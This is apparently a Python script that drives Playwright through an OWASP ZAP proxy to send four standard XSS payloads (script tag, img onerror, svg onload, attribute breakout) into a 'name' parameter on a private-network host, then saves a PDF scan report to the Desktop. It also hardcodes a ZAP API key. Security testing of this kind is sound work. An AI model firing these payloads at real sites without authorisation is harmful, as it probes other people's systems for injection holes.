from playwright.sync_api import sync_playwright, Playwright
from zapv2 import ZAPv2, reports
import time
import os
import sys

class SilentOutput:
    def write(self, msg): pass
    def flush(self): pass

sys.stdout = SilentOutput()  

# Config
ZAP_KEY = "kblijv49fdfgbl08ljvgqm2b5p"
PROXY = "http://localhost:8080"
TARGET_URL = "http://10.82.190.225:5000/"
xss_tests = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
]

def execute_automation(playwright: Playwright):
    zap = ZAPv2(apikey=ZAP_KEY, proxies={'http': PROXY})
    zap.core.new_session(name="silent_passive", overwrite=True)

    browser = playwright.firefox.launch(headless=True)
    context = browser.new_context(
        ignore_https_errors=True,
        proxy={"server": PROXY}
    )
    page = context.new_page()

    sys.stdout = sys.__stdout__

    for payload in xss_tests:
        print(f"Injecting Payload: {payload}")
        page.once("dialog", lambda dialog: dialog.dismiss())
        page.goto(f"{TARGET_URL}?name={payload}")
        time.sleep(1)

    sys.stdout = SilentOutput()
    while int(zap.pscan.records_to_scan) > 0:
        time.sleep(1)

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    zap_reporter = reports(zap)
    zap_reporter.generate(
        title="Silent Passive XSS Scan",
        template="traditional-pdf",
        description="Clean scan",
        reportfilename="zap_passive_silent_report.pdf",
        reportdir=desktop_path,
        display=False,
    )

    browser.close()

with sync_playwright() as pw:
    execute_automation(pw)

